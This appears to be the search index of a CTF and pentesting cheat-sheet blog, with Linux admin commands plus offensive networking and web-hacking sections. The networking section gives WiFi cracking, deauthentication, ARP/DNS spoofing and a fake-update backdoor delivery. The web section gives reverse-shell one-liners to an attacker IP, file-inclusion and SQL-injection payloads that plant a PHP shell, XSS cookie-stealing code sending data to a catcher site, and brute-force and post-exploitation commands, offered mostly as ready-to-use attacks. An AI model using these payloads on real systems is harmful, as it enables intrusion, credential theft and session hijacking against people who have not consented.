{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Welcome to CTF Roadmap \ud83c\udff4\u200d\u2620\ufe0f This blog focuses on cybersecurity. It aims to walk you through the process of cyber defense and offensive pentesting. Keep it at hand in order to get the flag!","title":"Welcome to CTF Roadmap \ud83c\udff4\u200d\u2620\ufe0f"},{"location":"#welcome-to-ctf-roadmap","text":"This blog focuses on cybersecurity. It aims to walk you through the process of cyber defense and offensive pentesting. Keep it at hand in order to get the flag!","title":"Welcome to CTF Roadmap \ud83c\udff4\u200d\u2620\ufe0f"},{"location":"forensics/","text":"Digital Forensics TODO","title":"Forensics"},{"location":"forensics/#digital-forensics","text":"TODO","title":"Digital Forensics"},{"location":"linux/","text":"Linux Hacking System Boot # rescue / emergency modes on GRUB startup systemd.unit=rescue|emergency # get all services managed by systemd systemctl list-unit-files --type=service --all # get service config systemctl cat {service} # get service status systemctl status {service} # manage service state systemctl start|stop|restart|reload {service} systemctl enable|disable {service} # get last system logs journalctl -e # manage system state systemctl reboot|suspend|hibernate|poweroff # edit grub config nano /etc/default/grub update-grub Filesystem # get partitions sudo blkid sudo fdisk -l lsblk -f # get mounted partitions df -h # create a destination folder sudo mkdir -p /media/dst # mount a partition sudo mount /dev/sda2 /media/dst # mount in read only mode sudo mount -r /dev/sda2 /media/dst # mount a partition with a specified format sudo mount -t ext4|vfat|ntfs /dev/sda2 /media/dst # mount a disk image sudo mount -o loop ubuntu-cdrom.iso /media/dst # unmount a partition sudo umount /media/dst # get automated mounts cat /etc/fstab # format a partition sudo mkfs.vfat -n {label} /dev/sda2 Network Configuration # get info about network interfaces ip -br a # assign ip addr to interface ip a add {ip_addr/mask} dev {interface} # remove ip addr from interface ip a del {ip_addr} dev {interface} # change interface state ip link set dev {interface} up|down # get ARP cache ip n show # get routing table ip r # add a new route ip r add {net/mask} via {gateway_ip} ip r add default {net/mask} via {gateway_ip} # delete a route ip r del default # change MAC addr ip link set dev {interface} address {mac_addr} Compilation # get system version uname -a # prepare the compilation ./configure # compile the program make # install the program make install # clean the sources make clean make mrproper # uninstall program make uninstall Archiving & Compression # create a basic archive tar -cvf {archive.tar} {files} # extract from a basic archive tar -xvf {archive.tar} # create and compress a gzip archive tar -zcvf {archive.tar.gz} {files} # extract from a gzip archive tar -zxvf {archive.tar.gz} # create and compress a bzip2 archive tar -jcvf {archive.tar.bz2} {files} # extract from a bzip2 archive tar -jxvf {archive.tar.bz2} # create and compress a lzma archive tar -Jcvf {archive.tar.xz} {files} # extract from a lzma archive tar -Jxvf {archive.tar.xz} # create and compress a zip archive zip {archive.zip} {files} zip -r {archive.zip} {directory} # extract from a zip archive unzip {archive.zip} -d {directory} Users & Groups # get users list cat /etc/passwd | awk -F: '{print $ 1}' # get groups list cat /etc/group | awk -F: '{print $ 1}' # create a user sudo useradd {user} sudo passwd {user} # create a group sudo groupadd {group} # delete a user sudo userdel -r {user} # delete a group sudo groupdel {group} # add user to group sudo usermod -aG {group} {user} # remove user from group sudo gpasswd -d {user} {group} # change user default shell sudo usermod -s /bin/sh {user} # get user membership groups {user} id {user} Root Access # login with root account in the current directory su # login with root account in its home directory su - # run an action as root sudo {action} # get root actions allowed sudo -l # grant access to sudo visudo /etc/sudoers SSH (Secure Shell) # connection ssh {user}@{host} -p {port} SCP (Secure Copy) # copy local file to remote destination scp {src} {user}@{host}:{dst} # copy local directory to remote destination scp -r {src} {user}@{host}:{dst} # copy remote data to local destination scp {user}@{host}:{src} {dst} FTP (File Transfer Protocol) # connection ftp {host} # change user session > user # download a file > get {file} # upload a file > put {file}","title":"Linux"},{"location":"linux/#linux-hacking","text":"","title":"Linux Hacking"},{"location":"linux/#system-boot","text":"# rescue / emergency modes on GRUB startup systemd.unit=rescue|emergency # get all services managed by systemd systemctl list-unit-files --type=service --all # get service config systemctl cat {service} # get service status systemctl status {service} # manage service state systemctl start|stop|restart|reload {service} systemctl enable|disable {service} # get last system logs journalctl -e # manage system state systemctl reboot|suspend|hibernate|poweroff # edit grub config nano /etc/default/grub update-grub","title":"System Boot"},{"location":"linux/#filesystem","text":"# get partitions sudo blkid sudo fdisk -l lsblk -f # get mounted partitions df -h # create a destination folder sudo mkdir -p /media/dst # mount a partition sudo mount /dev/sda2 /media/dst # mount in read only mode sudo mount -r /dev/sda2 /media/dst # mount a partition with a specified format sudo mount -t ext4|vfat|ntfs /dev/sda2 /media/dst # mount a disk image sudo mount -o loop ubuntu-cdrom.iso /media/dst # unmount a partition sudo umount /media/dst # get automated mounts cat /etc/fstab # format a partition sudo mkfs.vfat -n {label} /dev/sda2","title":"Filesystem"},{"location":"linux/#network-configuration","text":"# get info about network interfaces ip -br a # assign ip addr to interface ip a add {ip_addr/mask} dev {interface} # remove ip addr from interface ip a del {ip_addr} dev {interface} # change interface state ip link set dev {interface} up|down # get ARP cache ip n show # get routing table ip r # add a new route ip r add {net/mask} via {gateway_ip} ip r add default {net/mask} via {gateway_ip} # delete a route ip r del default # change MAC addr ip link set dev {interface} address {mac_addr}","title":"Network Configuration"},{"location":"linux/#compilation","text":"# get system version uname -a # prepare the compilation ./configure # compile the program make # install the program make install # clean the sources make clean make mrproper # uninstall program make uninstall","title":"Compilation"},{"location":"linux/#archiving-compression","text":"# create a basic archive tar -cvf {archive.tar} {files} # extract from a basic archive tar -xvf {archive.tar} # create and compress a gzip archive tar -zcvf {archive.tar.gz} {files} # extract from a gzip archive tar -zxvf {archive.tar.gz} # create and compress a bzip2 archive tar -jcvf {archive.tar.bz2} {files} # extract from a bzip2 archive tar -jxvf {archive.tar.bz2} # create and compress a lzma archive tar -Jcvf {archive.tar.xz} {files} # extract from a lzma archive tar -Jxvf {archive.tar.xz} # create and compress a zip archive zip {archive.zip} {files} zip -r {archive.zip} {directory} # extract from a zip archive unzip {archive.zip} -d {directory}","title":"Archiving &amp; Compression"},{"location":"linux/#users-groups","text":"# get users list cat /etc/passwd | awk -F: '{print $ 1}' # get groups list cat /etc/group | awk -F: '{print $ 1}' # create a user sudo useradd {user} sudo passwd {user} # create a group sudo groupadd {group} # delete a user sudo userdel -r {user} # delete a group sudo groupdel {group} # add user to group sudo usermod -aG {group} {user} # remove user from group sudo gpasswd -d {user} {group} # change user default shell sudo usermod -s /bin/sh {user} # get user membership groups {user} id {user}","title":"Users &amp; Groups"},{"location":"linux/#root-access","text":"# login with root account in the current directory su # login with root account in its home directory su - # run an action as root sudo {action} # get root actions allowed sudo -l # grant access to sudo visudo /etc/sudoers","title":"Root Access"},{"location":"linux/#ssh-secure-shell","text":"# connection ssh {user}@{host} -p {port}","title":"SSH (Secure Shell)"},{"location":"linux/#scp-secure-copy","text":"# copy local file to remote destination scp {src} {user}@{host}:{dst} # copy local directory to remote destination scp -r {src} {user}@{host}:{dst} # copy remote data to local destination scp {user}@{host}:{src} {dst}","title":"SCP (Secure Copy)"},{"location":"linux/#ftp-file-transfer-protocol","text":"# connection ftp {host} # change user session > user # download a file > get {file} # upload a file > put {file}","title":"FTP (File Transfer Protocol)"},{"location":"networking/","text":"Network Hacking Pre-Connection Attack # change MAC addr ifconfig {iface} down ifconfig {iface} hw ether {atk_mac_addr} ifconfig {iface} up # set monitor mode iwconfig {iface} airmon-ng check kill iwconfig {iface} mode monitor # busy network -> run packet sniffing airodump-ng {iface} airodump-ng --bssid {wap_mac_addr} --channel {channel} --write {output_file} {iface} # iddle network -> run fake authentication + packet injection airodump-ng --bssid {wap_mac_addr} --channel {channel} {iface} aireplay-ng --fakeauth 0 -a {wap_mac_addr} -h {atk_mac_addr} {iface} # deauthentication attack airodump-ng --bssid {wap_mac_addr} --channel {channel} {iface} airodump-ng --deauth {seconds} -a {wap_mac_addr} -c {target_mac_addr} {iface} Gaining Access WEP Cracking # cracking with packets sniffing aircrack-ng {output_file.cap} # cracking with ARP replay aireplay-ng --arpreplay -b {wap_mac_addr} -h {atk_mac_addr} {iface} aircrack-ng {arpreplay.cap} WPA/WPA2 Cracking # identify WPS wap wash --interface {iface} reaver --bssid {wap_mac_addr} --channel {channel} --interface {iface} -vvv --no-associate aireplay-ng --fakeauth 30 -a {wap_mac_addr} -h {atk_mac_addr} {iface} # cracking with capturing the handshake aireplay-ng --deauth 4 -a {wap_mac_addr} -c {target_mac_addr} {iface} airodump-ng --bssid {wap_mac_addr} --channel {channel} --write {output_file} {iface} crunch {minx} {max} {symbols} -o {wordlist} -t {pattern} aircrack-ng {output_file} -w {wordlist} # optimize handshake cracking with PMKs airolib-ng {db} --import passwd {wordlist} echo {wap_name} > {file} && airolib-ng {db} --import essid {file} airolib-ng {db} --batch aircrack-ng -r {db} {output_file_file} # optimize handshake cracking using GPU hashcat -I hashcat -m 2500 -d {gpu_device} {output_file.hccapx} {wordlist} Post-Connection Attack ARP & DNS Spoofing # discover connected clients netdiscover -r {net/mask} zenmap # MITM / ARP spoof echo 1 > /proc/sys/net/ipv4/ip_forward arpspoof -i {iface} -t {target_ip} {wap_ip} arpspoof -i {iface} -t {wap_ip} {target_ip} # create a bettercap caplet to automate ARP spoofing nano {script.cap} > net.probe on > net.recon on > set arp.spoof.fullduplex true > set arp.spoof.targets {target_ip} > arp.spoof on > set net.sniff.local true > net.sniff on # run bettercap to ARP spoof + HTTPS downgrade bettercap -iface {iface} -caplet {script.cap} > help {module} > caplets.show > hstshijack/hstshijack # DNS spoof attack bettercap -iface {iface} -caplet {script.cap} > set dns.spoof.all true > set dns.spoof.domains {website, *.website} > dns.spoof on # sniff with bettercap and analyze with wireshark bettercap -iface {iface} -caplet {script.cap} > set net.sniff.output {output_file.cap} Spoofing Exploit Use Case # create a backdoor cd Veil/config && ./setup.sh --silent --force ./veil.py > list > use 1 > list > use 15 (reverse HTTPS) > set {option} {value} > generate # create a fake update in order to install the backdoor ./evilgrade > show modules > configure {module} > show options > set {option} {value} > start # spoof the product owner website for the fake update bettercap -iface {iface} -caplet {script.cap} > set dns.spoof.all true > set dns.spoof.targets {website} > dns.spoof on # wait for backdoor incomming connection msfconsole > use exploit/mullti/handler > set PAYLOAD {reverse_https_path} > exploit # use meterpreter commands to hack the target > help > download {file} > upload {file} > execute -f {script} > shell","title":"Networking"},{"location":"networking/#network-hacking","text":"","title":"Network Hacking"},{"location":"networking/#pre-connection-attack","text":"# change MAC addr ifconfig {iface} down ifconfig {iface} hw ether {atk_mac_addr} ifconfig {iface} up # set monitor mode iwconfig {iface} airmon-ng check kill iwconfig {iface} mode monitor # busy network -> run packet sniffing airodump-ng {iface} airodump-ng --bssid {wap_mac_addr} --channel {channel} --write {output_file} {iface} # iddle network -> run fake authentication + packet injection airodump-ng --bssid {wap_mac_addr} --channel {channel} {iface} aireplay-ng --fakeauth 0 -a {wap_mac_addr} -h {atk_mac_addr} {iface} # deauthentication attack airodump-ng --bssid {wap_mac_addr} --channel {channel} {iface} airodump-ng --deauth {seconds} -a {wap_mac_addr} -c {target_mac_addr} {iface}","title":"Pre-Connection Attack"},{"location":"networking/#gaining-access","text":"","title":"Gaining Access"},{"location":"networking/#wep-cracking","text":"# cracking with packets sniffing aircrack-ng {output_file.cap} # cracking with ARP replay aireplay-ng --arpreplay -b {wap_mac_addr} -h {atk_mac_addr} {iface} aircrack-ng {arpreplay.cap}","title":"WEP Cracking"},{"location":"networking/#wpawpa2-cracking","text":"# identify WPS wap wash --interface {iface} reaver --bssid {wap_mac_addr} --channel {channel} --interface {iface} -vvv --no-associate aireplay-ng --fakeauth 30 -a {wap_mac_addr} -h {atk_mac_addr} {iface} # cracking with capturing the handshake aireplay-ng --deauth 4 -a {wap_mac_addr} -c {target_mac_addr} {iface} airodump-ng --bssid {wap_mac_addr} --channel {channel} --write {output_file} {iface} crunch {minx} {max} {symbols} -o {wordlist} -t {pattern} aircrack-ng {output_file} -w {wordlist} # optimize handshake cracking with PMKs airolib-ng {db} --import passwd {wordlist} echo {wap_name} > {file} && airolib-ng {db} --import essid {file} airolib-ng {db} --batch aircrack-ng -r {db} {output_file_file} # optimize handshake cracking using GPU hashcat -I hashcat -m 2500 -d {gpu_device} {output_file.hccapx} {wordlist}","title":"WPA/WPA2 Cracking"},{"location":"networking/#post-connection-attack","text":"","title":"Post-Connection Attack"},{"location":"networking/#arp-dns-spoofing","text":"# discover connected clients netdiscover -r {net/mask} zenmap # MITM / ARP spoof echo 1 > /proc/sys/net/ipv4/ip_forward arpspoof -i {iface} -t {target_ip} {wap_ip} arpspoof -i {iface} -t {wap_ip} {target_ip} # create a bettercap caplet to automate ARP spoofing nano {script.cap} > net.probe on > net.recon on > set arp.spoof.fullduplex true > set arp.spoof.targets {target_ip} > arp.spoof on > set net.sniff.local true > net.sniff on # run bettercap to ARP spoof + HTTPS downgrade bettercap -iface {iface} -caplet {script.cap} > help {module} > caplets.show > hstshijack/hstshijack # DNS spoof attack bettercap -iface {iface} -caplet {script.cap} > set dns.spoof.all true > set dns.spoof.domains {website, *.website} > dns.spoof on # sniff with bettercap and analyze with wireshark bettercap -iface {iface} -caplet {script.cap} > set net.sniff.output {output_file.cap}","title":"ARP &amp; DNS Spoofing"},{"location":"networking/#spoofing-exploit-use-case","text":"# create a backdoor cd Veil/config && ./setup.sh --silent --force ./veil.py > list > use 1 > list > use 15 (reverse HTTPS) > set {option} {value} > generate # create a fake update in order to install the backdoor ./evilgrade > show modules > configure {module} > show options > set {option} {value} > start # spoof the product owner website for the fake update bettercap -iface {iface} -caplet {script.cap} > set dns.spoof.all true > set dns.spoof.targets {website} > dns.spoof on # wait for backdoor incomming connection msfconsole > use exploit/mullti/handler > set PAYLOAD {reverse_https_path} > exploit # use meterpreter commands to hack the target > help > download {file} > upload {file} > execute -f {script} > shell","title":"Spoofing Exploit Use Case"},{"location":"profile/","text":"Author Pseudo : amorix ; Diploma : Cyber Defense Engineer - ENSIBS ; Platforms : Try Hack Me & Hack The Box . CTFs History Event Rank DG'hAck 2020 360/2069","title":"Author"},{"location":"profile/#author","text":"Pseudo : amorix ; Diploma : Cyber Defense Engineer - ENSIBS ; Platforms : Try Hack Me & Hack The Box .","title":"Author"},{"location":"profile/#ctfs-history","text":"Event Rank DG'hAck 2020 360/2069","title":"CTFs History"},{"location":"reversing/","text":"Reverse Engineering TODO","title":"Reversing"},{"location":"reversing/#reverse-engineering","text":"TODO","title":"Reverse Engineering"},{"location":"web/","text":"Web Hacking Information Gathering Whois Lookup ; Netcracft Site Report ; Robtex DNS Lookup ; Reverse DNS Lookup: Bing --> ip: {target_ip} ; Maltego. # subdomains discovery python knockpy.py {domain} # files and directories discovery dirb http://{domain} File Upload Vulnerabilities # create a reverse shell weevely generate {password} {rsh.php} # run reverse shell after upload weevely http://{rsh_location} {password} > help Bypass file upload filters using Burp: rsh.jpg --> upload --> rsh.php and rsh.jpg --> upload --> rsh.php.jpg . Code Execution Vulnerabilities # add some commands after the expected one {cmd} ; bash -i >& /dev/tcp/{atk_ip}/{atk_port} 0>&1 {cmd} && php -r '$sock=fsockopen(\"atk_ip\", atk_port); exec(\"/bin/sh -i <&3 >&3 2>&3\");'; {cmd} | nc -e /bin/sh {atk_ip} {atk_port} Local File Inclusion Vulnerabilities Exploit /proc/self/environ file: Burp --> Headers --> UA: <? passthru(\"nc -e /bin/sh {atk_ip} {atk_port}\"); ?> . Exploit /var/log/auth.log file: ssh \"<? passthru(base64_decode('{nc_cmd_base64_encoded}')); ?>\"@{target_ip} . Remote File Inclusion Vulnerabilities # create reverse shell echo '<?php passthru(\"nc -e /bin/sh {atk_ip} {atk_port}\"); ?>' > {rsh.txt} # include reverse shell from target curl http://{domain}/?page=http://{atk_ip}/{rsh.txt} # beautify a basic shell SHELL=/bin/sh script -q /dev/null SQL Injection Vulnerabilities Manual Approach # mysql basic connection mysql -u {user} -h {host} -p > show databases; > use {db}; > show tables; # search for injection INPUT=\"blabla' ORDER BY 1000 %23\" # general login bypass INPUT=\"blabla' %23\" INPUT=\"blabla' OR 1=1 %23\" # try to get the columns number fetched INPUT=\"blabla' ORDER BY {x} %23\" # get displayed columns number INPUT=\"blabla' UNION SELECT 1,2,3,...{x} %23\" # get basic database info INPUT=\"blabla' UNION SELECT database(),version(),user(),...{x} %23\" # get tables names INPUT=\"blabla' UNION SELECT table_name,null,null,...{x} FROM information_schema.tables WHERE table_schema = {db} %23\" # get table columns INPUT=\"blabla' UNION SELECT column_name,null,null,...{x} %23 FROM information_schema.columns WHERE table_name = {table} %23\" # display a sepcific record from list whereas only one is expected INPUT=\"blabla' UNION ... LIMIT {row_number},1 %23\" # bypass keyword filters INPUT=\"blabla' uNiOn sElEcT ... %23\" INPUT=\"blabla' uNiOn+sElEcT+... %23\" INPUT=\"blabla' uNiOn/**/sElEcT/**/... %23\" # read file from SQL INPUT=\"blabla' UNION SELECT null, load_file('{file}') %23\" # write file from SQL INPUT=\"blabla' UNION SELECT null, '<?php passthru(\"nc -e /bin/sh {atk_ip} {atk_port}\"); ?>' INTO OUTFILE '{/tmp/rsh.php}' %23\" Automated Approach # get db names sqlmap -u \"{url_with_params}\" --dbs # get current user sqlmap -u \"{url_with_params}\" --current-user # get tables from database sqlmap -u \"{url_with_params}\" --tables -D {db} # get columns from table sqlmap -u \"{url_with_params}\" --columns -T {table} -D {db} # dump table data sqlmap -u \"{url_with_params}\" --dump -T {table} -D {db} # get an os shell sqlmap -u \"{url_with_params}\" --os-shell # get an sql shell sqlmap -u \"{url_with_params}\" --sql-shell XSS Vulnerabilities <!-- search for XSS --> <script>alert(1);</script> <!-- create an HTML cookie catcher --> <svg onload=\"document.body.innerHTML=document.body.innerHTML.concat('<img src=\\'{catcher_site}'.concat(btoa(document.cookie)).concat('\\' />'))\" /> <!-- create a JS cookie catcher --> <script> var payload = \"var request = new XMLHttpRequest(); request.onreadystatechange = function () { var DONE = this.DONE || 4; if (this.readyState === DONE){ var encoded = btoa(request.responseText); document.location = '{catcher_site}?' + encoded; } }; request.open('GET', '/', true); request.send(null);\"; </script> <svg onload=\"eval(atob('{base64_encoded_payload}'))\" /> <!-- create an XSS reverse shell --> <img src=http://{atk_ip}/$(nc.traditional$IFS-e$IFS/bin/sh$IFS'{atk_ip}'$IFS'{atk_port}')> <!-- hook target using BEEF --> <script src=\"http://{atk_ip}:3000/hook.js\"></script> BEEF exploit --> Commands: Spyder Eye Screenshots ; Alert Dialog ; Social Network Pretty Theft ; Fake Notification Bar. CSRF Vulnerabilities <!-- create an hidden form to be submitted by the target --> <form id=\"csrf-form\" action=\"http://{full_path_to_form}\" method=\"post\" hidden> <input name=\"{blabla}\" value=\"{blabla}\"> </form> <script>document.getElementById(\"csrf-form\").submit();</script> <!-- create a link that redirect to a website hosting the csrf form --> <a href=\"https://{atk}.tiiny.site\"></a> Brute Force & Dictionnary Attack # create a wordlist crunch {min} {max} {symbols} -t {pattern} -o {outfile} # crack a post login form using the wordlist hydra {target_ip} -l {user} -P {wordlist} http-post-form \"/{path_to_login_form}:{user}=^USER^&{password}=^PASS^:F={fail_login_msg}\" Post Exploitation # escalate from basic reverse shell to weevely atk > weevely generate {passwd} {rsh.txt} target> wget http://{atk_ip}/{rsh.txt} > mv {rsh.txt} {rsh.php} atk > weevely http://{target_ip}/{rsh.php} {passwd} # advanced weevely usage > help > system-info > shell-sh -vector {vect} {cmd} > file_read -vector {vect} {file} > file_download -vector {vect} {remote_path} {local_path} > file_upload -vector {vect} {local_path} ./{remote_path} > backdoor_reversetcp -vector {vect} {atk_ip} {atk_port} > sql_dump -vector {vect} -host localhost -lpath {local_path} {db} {user} {passwd}","title":"Web"},{"location":"web/#web-hacking","text":"","title":"Web Hacking"},{"location":"web/#information-gathering","text":"Whois Lookup ; Netcracft Site Report ; Robtex DNS Lookup ; Reverse DNS Lookup: Bing --> ip: {target_ip} ; Maltego. # subdomains discovery python knockpy.py {domain} # files and directories discovery dirb http://{domain}","title":"Information Gathering"},{"location":"web/#file-upload-vulnerabilities","text":"# create a reverse shell weevely generate {password} {rsh.php} # run reverse shell after upload weevely http://{rsh_location} {password} > help Bypass file upload filters using Burp: rsh.jpg --> upload --> rsh.php and rsh.jpg --> upload --> rsh.php.jpg .","title":"File Upload Vulnerabilities"},{"location":"web/#code-execution-vulnerabilities","text":"# add some commands after the expected one {cmd} ; bash -i >& /dev/tcp/{atk_ip}/{atk_port} 0>&1 {cmd} && php -r '$sock=fsockopen(\"atk_ip\", atk_port); exec(\"/bin/sh -i <&3 >&3 2>&3\");'; {cmd} | nc -e /bin/sh {atk_ip} {atk_port}","title":"Code Execution Vulnerabilities"},{"location":"web/#local-file-inclusion-vulnerabilities","text":"Exploit /proc/self/environ file: Burp --> Headers --> UA: <? passthru(\"nc -e /bin/sh {atk_ip} {atk_port}\"); ?> . Exploit /var/log/auth.log file: ssh \"<? passthru(base64_decode('{nc_cmd_base64_encoded}')); ?>\"@{target_ip} .","title":"Local File Inclusion Vulnerabilities"},{"location":"web/#remote-file-inclusion-vulnerabilities","text":"# create reverse shell echo '<?php passthru(\"nc -e /bin/sh {atk_ip} {atk_port}\"); ?>' > {rsh.txt} # include reverse shell from target curl http://{domain}/?page=http://{atk_ip}/{rsh.txt} # beautify a basic shell SHELL=/bin/sh script -q /dev/null","title":"Remote File Inclusion Vulnerabilities"},{"location":"web/#sql-injection-vulnerabilities","text":"","title":"SQL Injection Vulnerabilities"},{"location":"web/#manual-approach","text":"# mysql basic connection mysql -u {user} -h {host} -p > show databases; > use {db}; > show tables; # search for injection INPUT=\"blabla' ORDER BY 1000 %23\" # general login bypass INPUT=\"blabla' %23\" INPUT=\"blabla' OR 1=1 %23\" # try to get the columns number fetched INPUT=\"blabla' ORDER BY {x} %23\" # get displayed columns number INPUT=\"blabla' UNION SELECT 1,2,3,...{x} %23\" # get basic database info INPUT=\"blabla' UNION SELECT database(),version(),user(),...{x} %23\" # get tables names INPUT=\"blabla' UNION SELECT table_name,null,null,...{x} FROM information_schema.tables WHERE table_schema = {db} %23\" # get table columns INPUT=\"blabla' UNION SELECT column_name,null,null,...{x} %23 FROM information_schema.columns WHERE table_name = {table} %23\" # display a sepcific record from list whereas only one is expected INPUT=\"blabla' UNION ... LIMIT {row_number},1 %23\" # bypass keyword filters INPUT=\"blabla' uNiOn sElEcT ... %23\" INPUT=\"blabla' uNiOn+sElEcT+... %23\" INPUT=\"blabla' uNiOn/**/sElEcT/**/... %23\" # read file from SQL INPUT=\"blabla' UNION SELECT null, load_file('{file}') %23\" # write file from SQL INPUT=\"blabla' UNION SELECT null, '<?php passthru(\"nc -e /bin/sh {atk_ip} {atk_port}\"); ?>' INTO OUTFILE '{/tmp/rsh.php}' %23\"","title":"Manual Approach"},{"location":"web/#automated-approach","text":"# get db names sqlmap -u \"{url_with_params}\" --dbs # get current user sqlmap -u \"{url_with_params}\" --current-user # get tables from database sqlmap -u \"{url_with_params}\" --tables -D {db} # get columns from table sqlmap -u \"{url_with_params}\" --columns -T {table} -D {db} # dump table data sqlmap -u \"{url_with_params}\" --dump -T {table} -D {db} # get an os shell sqlmap -u \"{url_with_params}\" --os-shell # get an sql shell sqlmap -u \"{url_with_params}\" --sql-shell","title":"Automated Approach"},{"location":"web/#xss-vulnerabilities","text":"<!-- search for XSS --> <script>alert(1);</script> <!-- create an HTML cookie catcher --> <svg onload=\"document.body.innerHTML=document.body.innerHTML.concat('<img src=\\'{catcher_site}'.concat(btoa(document.cookie)).concat('\\' />'))\" /> <!-- create a JS cookie catcher --> <script> var payload = \"var request = new XMLHttpRequest(); request.onreadystatechange = function () { var DONE = this.DONE || 4; if (this.readyState === DONE){ var encoded = btoa(request.responseText); document.location = '{catcher_site}?' + encoded; } }; request.open('GET', '/', true); request.send(null);\"; </script> <svg onload=\"eval(atob('{base64_encoded_payload}'))\" /> <!-- create an XSS reverse shell --> <img src=http://{atk_ip}/$(nc.traditional$IFS-e$IFS/bin/sh$IFS'{atk_ip}'$IFS'{atk_port}')> <!-- hook target using BEEF --> <script src=\"http://{atk_ip}:3000/hook.js\"></script> BEEF exploit --> Commands: Spyder Eye Screenshots ; Alert Dialog ; Social Network Pretty Theft ; Fake Notification Bar.","title":"XSS Vulnerabilities"},{"location":"web/#csrf-vulnerabilities","text":"<!-- create an hidden form to be submitted by the target --> <form id=\"csrf-form\" action=\"http://{full_path_to_form}\" method=\"post\" hidden> <input name=\"{blabla}\" value=\"{blabla}\"> </form> <script>document.getElementById(\"csrf-form\").submit();</script> <!-- create a link that redirect to a website hosting the csrf form --> <a href=\"https://{atk}.tiiny.site\"></a>","title":"CSRF Vulnerabilities"},{"location":"web/#brute-force-dictionnary-attack","text":"# create a wordlist crunch {min} {max} {symbols} -t {pattern} -o {outfile} # crack a post login form using the wordlist hydra {target_ip} -l {user} -P {wordlist} http-post-form \"/{path_to_login_form}:{user}=^USER^&{password}=^PASS^:F={fail_login_msg}\"","title":"Brute Force &amp; Dictionnary Attack"},{"location":"web/#post-exploitation","text":"# escalate from basic reverse shell to weevely atk > weevely generate {passwd} {rsh.txt} target> wget http://{atk_ip}/{rsh.txt} > mv {rsh.txt} {rsh.php} atk > weevely http://{target_ip}/{rsh.php} {passwd} # advanced weevely usage > help > system-info > shell-sh -vector {vect} {cmd} > file_read -vector {vect} {file} > file_download -vector {vect} {remote_path} {local_path} > file_upload -vector {vect} {local_path} ./{remote_path} > backdoor_reversetcp -vector {vect} {atk_ip} {atk_port} > sql_dump -vector {vect} -host localhost -lpath {local_path} {db} {user} {passwd}","title":"Post Exploitation"},{"location":"windows/","text":"Windows Hacking TODO","title":"Windows"},{"location":"windows/#windows-hacking","text":"TODO","title":"Windows Hacking"}]}